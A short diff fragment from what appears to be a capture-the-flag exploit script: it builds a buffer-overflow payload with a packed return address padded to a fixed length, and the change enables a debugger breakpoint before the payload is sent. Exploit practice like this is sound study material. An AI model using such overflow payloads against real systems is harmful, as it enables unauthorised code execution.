@@ -57,7 +57,7 @@ payload += '\x37'
 payload += p64(0x0401253)
 payload = payload.ljust(0x441,'A')
 # ru('')
-# debug('b *0x40129e')
+debug('b *0x40129e')
 sl(payload)
 
 # info_addr('tag',addr)
